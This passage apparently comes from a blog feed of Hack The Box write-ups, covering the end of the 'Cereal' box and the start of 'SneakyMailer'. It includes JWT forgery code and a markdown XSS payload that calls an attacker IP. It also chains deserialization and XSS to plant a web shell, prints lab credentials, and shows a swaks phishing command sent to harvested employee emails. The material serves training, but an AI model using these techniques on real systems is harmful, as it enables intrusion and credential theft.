	<span style="color:#e6db74">&#34;github.com/dgrijalva/jwt-go&#34;</span>
)

<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">UserService</span> <span style="color:#66d9ef">interface</span> {
	<span style="color:#a6e22e">CreateToken</span>(<span style="color:#a6e22e">userID</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">string</span>
}

<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">jwtService</span> <span style="color:#66d9ef">struct</span> {
	<span style="color:#a6e22e">secretKey</span> <span style="color:#66d9ef">string</span>
}

<span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">s</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">jwtService</span>) <span style="color:#a6e22e">CreateToken</span>() <span style="color:#66d9ef">string</span> {
	<span style="color:#a6e22e">claims</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">StandardClaims</span>{
		<span style="color:#a6e22e">ExpiresAt</span>: <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">AddDate</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">7</span>).<span style="color:#a6e22e">UTC</span>().<span style="color:#a6e22e">Unix</span>(),
	}

	<span style="color:#a6e22e">token</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">NewWithClaims</span>(<span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">SigningMethodHS256</span>, <span style="color:#a6e22e">claims</span>)
	<span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">SignedString</span>([]byte(<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">secretKey</span>))
	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		panic(<span style="color:#a6e22e">err</span>)
	}
	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">t</span>
}

<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">User</span> <span style="color:#66d9ef">struct</span> {
	<span style="color:#a6e22e">UserId</span>   <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;userId,omitempty&#34;`</span>
	<span style="color:#a6e22e">Username</span> <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;username,omitempty&#34;`</span>
	<span style="color:#a6e22e">Token</span>    <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;token,omitempty&#34;`</span>
}

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
	<span style="color:#a6e22e">jwt</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">jwtService</span>{}
	<span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">secretKey</span> = <span style="color:#e6db74">&#34;secretlhfIH&amp;FY*#oysuflkhskjfhefesf&#34;</span>

	<span style="color:#a6e22e">cu</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">User</span>{
		<span style="color:#a6e22e">UserId</span>:   <span style="color:#e6db74">&#34;1&#34;</span>,
		<span style="color:#a6e22e">Username</span>: <span style="color:#e6db74">&#34;iamf&#34;</span>,
		<span style="color:#a6e22e">Token</span>:    <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">CreateToken</span>(),
	}

	<span style="color:#a6e22e">currentUser</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">Marshal</span>(<span style="color:#a6e22e">cu</span>)
	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#a6e22e">currentUser</span>)
}
</code></pre></div><p>A bit messy but that&rsquo;s work.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «cereal» «10.10.14.3»
$ go run main.go
<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;userId&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;iamf&#34;</span>,<span style="color:#e6db74">&#34;token&#34;</span>:<span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjM4MTgwMzh9.XAcgRqhpgyJARsBMEWg1UOlUeRnQU4bvbk1SpAv3vDM&#34;</span><span style="color:#f92672">}</span>
</code></pre></div><h4 id="login">Login</h4>
<p>Refreshing the page after storing the token into the browser&rsquo;s local storage logs me in.</p>
<p><div class="img-container"><img src="imgs/image-20210609113605143.png" alt="image-20210609113605143"  /></div>
</p>
<h4 id="input-testing">Input testing</h4>
<p>When I submitted a URL which points to my attacking machine, I received a GET request coming from the Title field.</p>
<p><div class="img-container"><img src="imgs/image-20210605163056142.png" alt="image-20210605163056142"  /></div>
</p>
<p>Here how the request and response looks like.</p>
<p><div class="img-container"><img src="imgs/image-20210605183457568.png" alt="image-20210605183457568"  /></div>
</p>
<h3 id="source--code-analysis-2">Source  Code Analysis #2</h3>
<p>I decided to mix it with images hehe.</p>
<h4 id="deserialization-vulnerability">Deserialization Vulnerability</h4>
<p>Looking into the request controller,  <code>Controllers/RequestsController.cs</code>, it turns out that each Cereal Request (POST) sent is saved in database without validation on the body request.</p>
<p><div class="img-container"><img src="imgs/image-20210609115652148.png" alt="image-20210609115652148"  /></div>
</p>
<p>Because the validation only is on the client side, I could send a cereal request in any format. Here is for example of what I mean:</p>
<p><div class="img-container"><img src="imgs/image-20210609122743196.png" alt="image-20210609122743196"  /></div>
</p>
<p>The cereal database&rsquo;s name can be found inside  <code>CerealContext.cs</code></p>
<p><div class="img-container"><img src="imgs/image-20210609120019771.png" alt="image-20210609120019771"  /></div>
</p>
<p>Back into the request controller, there is a comment inside the <code>Get</code> function that points out about deserialization (previously seen at comparing the commit logs):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...&lt;SNIP&gt;...
<span style="color:#a6e22e">        [Authorize(Policy = &#34;RestrictIP&#34;)]</span>
<span style="color:#a6e22e">        [HttpGet(&#34;{id}&#34;)]</span>
        <span style="color:#66d9ef">public</span> IActionResult Get(<span style="color:#66d9ef">int</span> id)
        {
            <span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> db = <span style="color:#66d9ef">new</span> CerealContext())
            {
                <span style="color:#66d9ef">string</span> json = db.Requests.Where(x =&gt; x.RequestId == id).SingleOrDefault().JSON;
                <span style="color:#75715e">// Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> (json.ToLower().Contains(<span style="color:#e6db74">&#34;objectdataprovider&#34;</span>) || json.ToLower().Contains(<span style="color:#e6db74">&#34;windowsidentity&#34;</span>) || json.ToLower().Contains(<span style="color:#e6db74">&#34;system&#34;</span>))
                {
                    <span style="color:#66d9ef">return</span> BadRequest(<span style="color:#66d9ef">new</span> { message = <span style="color:#e6db74">&#34;The cereal police have been dispatched.&#34;</span> });
                }
                <span style="color:#66d9ef">var</span> cereal = JsonConvert.DeserializeObject(json, <span style="color:#66d9ef">new</span> JsonSerializerSettings
                {
                    TypeNameHandling = TypeNameHandling.Auto
                });
                <span style="color:#66d9ef">return</span> Ok(cereal.ToString());
            }
        }
</code></pre></div><p>The <code>Get</code> function can only be accessed if the request IP is in the whitelist (defined in <code>appsettings.json</code> ) and it takes one parameter called <code>id</code> (GET <code>/requests/{id}</code>).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#a6e22e">[Authorize(Policy = &#34;RestrictIP&#34;)]</span>
<span style="color:#a6e22e">[HttpGet(&#34;{id}&#34;)]</span>
</code></pre></div><p>This code blocks the gadget classes used for .NET deserialization attack.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;objectdataprovider&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;windowsidentity&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;system&#34;</span><span style="color:#f92672">))</span>
</code></pre></div><p>But, there is a class called <code>DownloadHelper</code> that has a function which can be used to send a download request:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...&lt;SNIP&gt;...
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DownloadHelper</span>
    {
        <span style="color:#66d9ef">private</span> String <span style="color:#ae81ff">_</span>URL;
        <span style="color:#66d9ef">private</span> String <span style="color:#ae81ff">_F</span>ilePath;
        <span style="color:#66d9ef">public</span> String URL
...&lt;SNIP&gt;...
        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> Download()
        {
            <span style="color:#66d9ef">using</span> (WebClient wc = <span style="color:#66d9ef">new</span> WebClient())
            {
                <span style="color:#66d9ef">if</span> (!<span style="color:#66d9ef">string</span>.IsNullOrEmpty(<span style="color:#ae81ff">_</span>URL) &amp;&amp; !<span style="color:#66d9ef">string</span>.IsNullOrEmpty(<span style="color:#ae81ff">_F</span>ilePath))
                {
                    wc.DownloadFile(<span style="color:#ae81ff">_</span>URL, ReplaceLastOccurrence(<span style="color:#ae81ff">_F</span>ilePath,<span style="color:#e6db74">&#34;\\&#34;</span>, <span style="color:#e6db74">&#34;\\21098374243-&#34;</span>));
                }
            }
        }
</code></pre></div><p>I could use <code>DownloadHelper</code> class to download a web shell hosted on my machine by sending a serialized form of this class via the Cereal Request.</p>
<p>The problem here I couldn&rsquo;t make a GET request to <code>requests/{id}</code>  because there is an IP restriction policy.</p>
<h4 id="xss-vulnerability">XSS Vulnerability</h4>
<p>When tracking down where the previous GET request coming, I find out that each Cereal Request sent lands on the admin page (<code>AdminPage.jsx</code>).</p>
<p><div class="img-container"><img src="imgs/image-20210609114906150.png" alt="image-20210609114906150"  /></div>
</p>
<p>And one of the app library that is used in the admin page called <code>react-marked-down</code> has an <a href="https://hackerone.com/reports/344069">XSS vulnerability</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Accordion</span>.<span style="color:#a6e22e">Toggle</span> <span style="color:#a6e22e">as</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">Button</span>} <span style="color:#a6e22e">variant</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;link&#34;</span> <span style="color:#a6e22e">eventKey</span><span style="color:#f92672">=</span>{<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">requestId</span>} <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;expand&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span>{<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">requestId</span>}<span style="color:#f92672">&gt;</span>
    {<span style="color:#a6e22e">requestData</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;string&#39;</span> <span style="color:#f92672">&amp;&amp;</span> 
        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">MarkdownPreview</span> <span style="color:#a6e22e">markedOptions</span><span style="color:#f92672">=</span>{{ <span style="color:#a6e22e">sanitize</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }} <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span>} <span style="color:#f92672">/&gt;</span> <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
</code></pre></div><p>I could confirm the vulnerability with the following payload:</p>
<pre><code>[XSS](javascript: document.write`&lt;img src='http://10.10.14.3/iamf'/&gt;`)
</code></pre><p><div class="img-container"><img src="imgs/image-20210605212246743.png" alt="image-20210605212246743"  /></div>
</p>
<p>With a few experiments, URL encoding seems to work as well</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown">[<span style="color:#f92672">XSS</span>](<span style="color:#a6e22e">javascript: document.write%28%22&lt;img src=&#39;http://10.10.14.3/iamf&#39;&gt;%22%29</span>)
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-sonny">Shell as Sonny</h3>
<h4 id="web-shell-upload-via-xss-and-deserialization">Web Shell Upload via XSS and Deserialization</h4>
<p>I&rsquo;ll summarize that:</p>
<ul>
<li>There is an uploads directory at <code>https://source.cereal.htb/uploads/</code>.</li>
<li>From the previous code analysis, the gadget class are filtered, but there is one class called <code>DownloadHelper</code> that can be accessed and it has a download function.</li>
<li>There is a SSRF (not sure yet) in the Title section, which can be used along with the XSS vulnerability to bypass the IP restriction.</li>
</ul>
<p>The tactics:</p>
<ul>
<li><a href="https://speakerdeck.com/pwntester/attacking-net-serialization?slide=25">Serialized</a> <code>DownloadHelper</code> class which contains a web shell URL that points to the attacking machine, and send it via the Cereal Request, note the ID.</li>
<li>Use XSS which bypasses the IP restriction, to make a GET request to <code>cereal.htb/request/{the ID}</code> to trigger the deserialization,</li>
<li>Confirms the web shell at <code>https://cereal.source.htb/uploads/shell-name.aspx</code></li>
</ul>
<p>I already made a <a href="https://gist.github.com/fahmifj/c935b12c4b0a66ee30a7aa825d3c7fe1">script</a> to chain those vulnerabilities:</p>
<p><div class="img-container"><img src="imgs/image-20210609125605658.png" alt="image-20210609125605658"  /></div>
</p>
<blockquote>
<p>That&rsquo;s on different IP because I decided to ran the exploit again to make sure it&rsquo;s still work XD</p>
</blockquote>
<p>I can access my web shell on <code>http://source.cereal.htb/uploads/iamf.aspx</code></p>
<p><div class="img-container"><img src="imgs/image-20210609125710180.png" alt="image-20210609125710180"  /></div>
</p>
<h3 id="ssh---sonny">SSH - sonny</h3>
<p>A quick check on the web directory, I find the <code>cereal.db</code> at <code>c:\inetpub\cereal\db\cereal.db</code> and it contains a string that looks like a set of credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210609133307066.png" alt="image-20210609133307066"  /></div>
</p>
<p>I tried it on SSH (<code>sonny:mutual.madden.manner38974</code>) and it worked.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «exploits» «10.10.14.2» 
$ ssh sonny@cereal.htb
sonny@cereal.htb&#39;s password: 
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

sonny@CEREAL C:\Users\sonny&gt;dir desktop\ 
 Volume in drive C has no label.                   
 Volume Serial Number is C4EF-2153                 
                                                   
 Directory of C:\Users\sonny\desktop               
                                                   
11/16/2020  05:19 AM    &lt;DIR&gt;          .           
11/16/2020  05:19 AM    &lt;DIR&gt;          ..          
06/07/2021  09:59 PM                34 user.txt    
               1 File(s)             34 bytes      
               2 Dir(s)   7,621,619,712 bytes free 
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<p>It&rsquo;s retired already.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer</a></li>
<li><a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0">https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0</a></li>
<li><a href="https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any">https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - SneakyMailer</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-sneakymailer/</link>
      <pubDate>Wed, 28 Apr 2021 21:28:30 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-sneakymailer/</guid>
      <description>You&amp;#39;ve got mail!</description>
      <content:encoded><![CDATA[<p>SneakyMailer is a medium difficulty Linux machine from Hack The Box. It starts by obtaining credentials through phishing attack. The credentials allows me to access one of the users' mailboxes and obtain an FTP account. Foothold on the system can be gained after dropping a reverse shell on the FTP. Internal enumeration discovers a PyPI server that can be exploited to escalate myself to user by uploading a malicious package. The user is allowed to run <code>pip3</code> with sudo privileges, and this can be leveraged to obtain root access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Phishing</li>
<li>PyPI Package Exploitation</li>
<li>Exploiting sudo privileges on pip3</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ mkdir nmap; nmap -sC -sV -oN nmap/inital-sneaky 10.10.10.197 -v

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey:
|   <span style="color:#ae81ff">2048</span> 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd <span style="color:#f92672">(</span>released 2018<span style="color:#f92672">)</span>
|_imap-capabilities: ENABLE STARTTLS UTF8<span style="color:#f92672">=</span>ACCEPTA0001 CHILDREN ACL ACL2<span style="color:#f92672">=</span>UNION THREAD<span style="color:#f92672">=</span>ORDEREDSUBJECT THREAD<span style="color:#f92672">=</span>REFERENCES UIDPLUS OK SORT QUOTA IDLE completed CAPABILITY IMAP4rev1 NAMESPACE
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>localhost/organizationName<span style="color:#f92672">=</span>Courier Mail Server/stateOrProvinceName<span style="color:#f92672">=</span>NY/countryName<span style="color:#f92672">=</span>US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd <span style="color:#f92672">(</span>released 2018<span style="color:#f92672">)</span>
|_imap-capabilities: ENABLE AUTH<span style="color:#f92672">=</span>PLAIN CHILDREN ACL ACL2<span style="color:#f92672">=</span>UNION THREAD<span style="color:#f92672">=</span>ORDEREDSUBJECT THREAD<span style="color:#f92672">=</span>REFERENCES UIDPLUS OK SORT QUOTA completed IDLE IMAP4rev1 CAPABILITY UTF8<span style="color:#f92672">=</span>ACCEPTA0001 NAMESPACE
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>localhost/organizationName<span style="color:#f92672">=</span>Courier Mail Server/stateOrProvinceName<span style="color:#f92672">=</span>NY/countryName<span style="color:#f92672">=</span>US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>With an initial scan, <code>nmap</code> discovered seven ports open and also identified the services behind them.</p>
<p>I’ll summarize the result:</p>
<ul>
<li>There is an FTP service on port 21, but <code>nmap</code> shows no sign that anonymous login is allowed.</li>
<li>An SSH service on port 22</li>
<li>Three email protocols, SMTP on port 25, IMAP on port 143 and secure IMAP on port 993</li>
<li>And a web server hosting two sites on port 80 and 8080. <code>nmap</code> identifies the hostname as <code>sneakycorp.htb</code>.</li>
</ul>
<p>I’ll add <code>sneakycorp.htb</code> to my <code>/etc/hosts</code> file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ echo <span style="color:#e6db74">&#39;10.10.10.197 sneakycorp.htb&#39;</span> &gt;&gt; /etc/hosts 
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting <code>sneakycorp.htb</code> on port 80 displays a project dashboard for a company called SneakyCorp. One project is marked as &ldquo;Complete!&rdquo; while the other one seems still in progress for about 80%.</p>
<p><img src="imgs/7f7b01dbdf744b97b9ccc3c260288ee1.png" alt="7f7b01dbdf744b97b9ccc3c260288ee1" style="zoom:67%;" /></p>
<p>Clicking on the &ldquo;Team&rdquo; menu points to<code>/team.php</code>. This page shows a table contains the employees' data of SneakyCorp.</p>
<p><img src="imgs/1a6090141fa446bd88cf25781913b8d5.png" alt="1a6090141fa446bd88cf25781913b8d5" style="zoom:67%;" /></p>
<p>I saved the whole table data and stored it in a file called <code>team</code>.</p>
<p><img src="imgs/c3c89ffbc8854cf1abf6ebece09b0197.png" alt="c3c89ffbc8854cf1abf6ebece09b0197" style="zoom:67%;" /></p>
<p>I can grab the emails using the <code>grep</code> and <code>tr</code> command as follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ cat team | egrep -o <span style="color:#e6db74">&#34;[^[:space:]]+@[^[:space:]]+&#34;</span> | tr -d <span style="color:#e6db74">&#34;&lt;&gt;&#34;</span> | tee emails.list
</code></pre></div><p><img src="imgs/612596863de94710b3a4ed80fd375133.png" alt="612596863de94710b3a4ed80fd375133" style="zoom:67%;" /></p>
<p>I ran <code>gobuster</code> but it didn&rsquo;t show any interesting results.</p>
<h3 id="tcp-8080--website">TCP 8080 —  Website</h3>
<p>It returns the default Nginx page.</p>
<h3 id="tcp-25--smtp-mail">TCP 25  —  SMTP (Mail)</h3>
<p>I tried to send an email, and it got queued.</p>
<p><img src="imgs/4b5e0238399640bd9b40a2810102ce39.png" alt="4b5e0238399640bd9b40a2810102ce39" style="zoom:67%;" /></p>
<p>Given a list of email addresses, the box title, as well as the illustration, I can guess it has something to do with email phishing.</p>
<h4 id="email-phishing">Email Phishing</h4>
<p>I&rsquo;ll setup <code>netcat</code> listener on port 80, and then I&rsquo;ll use a tool called <code>swaks</code> to send an email containing my IP address to all the email addresses I&rsquo;ve got.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ swaks --server <span style="color:#e6db74">&#39;10.10.10.197&#39;</span> --to <span style="color:#e6db74">`</span>cat emails.list | tr <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#e6db74">&#39;,&#39;</span><span style="color:#e6db74">`</span> --from admin@sneakymailer.htb --body <span style="color:#e6db74">&#34;http://10.10.14.42/&#34;</span>
</code></pre></div><p>And there is an HTTP POST request coming to my listener.</p>
<p><img src="imgs/330df9a36349481fb8d7cef7660c535e.png" alt="330df9a36349481fb8d7cef7660c535e" style="zoom:67%;" /></p>
<p>The request body contains this data.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
</span></code></pre></div><p>It can be decoded using an online url decoder.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd@sneakymailer.htb&amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht
</span></code></pre></div><p>The parameter <code>password</code> and <code>rpassword</code> seem juicy where the <strong>r</strong> might refer to reset or retype the password. Unfortunately, the password doesn&rsquo;t work on SSH and FTP.</p>
<h3 id="tcp-143---imap">TCP 143 - IMAP</h3>
<p>With the obtained credentials, I can try to use it on IMAP, but since Kali doesn’t have any builtin mail apps, I&rsquo;ll need an email client, and I end up with <a href="https://sylpheed.sraoss.jp/en/">sylpheed</a>. You can install it with <code>sudo apt-get install sylpheed</code>.</p>
<p>But before moving on, I&rsquo;ll add <code>sneakymailer.htb</code> to my<code>/etc/hosts</code> file to avoid problems with dns/name resolution.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ echo <span style="color:#e6db74">&#39;10.10.10.197 sneakymailer.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><h4 id="initial-setup">Initial Setup</h4>
<p>As this is my first install, I&rsquo;ll have to determine the location of the mailbox (storage) for receiving email from the mail server. I decided to put it on<code>/root/sneaky/loot/Mail</code>.</p>
<p><img src="imgs/336c2c9d596e4a86ba1ce454e912b2d9.png" alt="336c2c9d596e4a86ba1ce454e912b2d9" style="zoom:67%;" /></p>
<p>Next I&rsquo;ll have to determine the account type. Because the box only has IMAP listening and we&rsquo;re not going outside VPN connection, then I should choose IMAP4.</p>
<p><img src="imgs/aaa3354fe43a4564b1b13aec5c14a83c.png" alt="aaa3354fe43a4564b1b13aec5c14a83c" style="zoom:67%;" /></p>
<p>In the following section, I&rsquo;ll use the display name Paul and the email address <code>paulbyrd@sneakymailer.htb</code> that I obtained through phishing.</p>
<p><img src="imgs/3361aa3232224c8890c857f9e913becc.png" alt="3361aa3232224c8890c857f9e913becc" style="zoom:67%;" /></p>
<p>I lost some screenshots after the step above, but here is the final configuration.</p>
<p><img src="imgs/8ded1188afee41fd852d14e4943fc9b4.png" alt="8ded1188afee41fd852d14e4943fc9b4" style="zoom:67%;" /></p>
<p>Lastly, enter <code>paulbyrd</code>&rsquo;s password, <code>^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</code>, if the app asks for it after applying the configuration. Now wait until it fetches all the emails from the server.</p>
<h4 id="retrieving-the-emails">Retrieving the emails</h4>
<p>In Paul&rsquo;s mailbox, I found two emails inside the &ldquo;Sent Items&rdquo; folder.</p>
<p>The first email was sent with the subject of &ldquo;Password Reset&rdquo;. In this email, Paul asks the administrator to change the developer account password. I&rsquo;ll grab the credentials of the developer account.</p>
<p><img src="imgs/540344afea7f42debd7cdc36f3fadd32.png" alt="540344afea7f42debd7cdc36f3fadd32" style="zoom:67%;" /></p>
<p>The second email was sent with the subject &ldquo;Module testing&rdquo;, but right now I&rsquo;m not sure what it is about.</p>
